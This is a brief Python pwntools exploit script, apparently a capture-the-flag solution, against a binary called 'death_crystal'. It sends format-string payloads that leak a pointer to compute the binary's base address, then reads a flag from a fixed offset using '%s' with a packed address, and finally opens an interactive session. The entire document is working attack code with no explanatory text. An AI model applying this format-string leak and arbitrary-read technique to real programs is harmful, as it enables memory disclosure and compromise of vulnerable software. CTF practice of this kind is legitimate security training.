#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./death_crystal')
elf = ELF('./death_crystal')

def fmt(s):
    r.recvuntil('Foresee:\n')
    r.sendline(s)

'''
aaaaaaaa%%%1p%%%1p%%%1p%%%1p%%%1p%%%1p%%%1p%%%1p%%%1p
aaaaaaaa%0x1%0x25%0x31%(nil)%(nil)%0x6161616161616161
'''

payload = '%d'*11 + '%1p'

raw_input('#')
fmt(payload)

r.recvuntil('0x')
binary_base = int('0x' + r.recvuntil('\n')[:-1],16) - 0xb20
print 'binary_base :',hex(binary_base)

flag = binary_base + 0x202060

payload = '%d'*8 + '.%s.abcd' + p64(flag)

fmt(payload)

r.interactive()
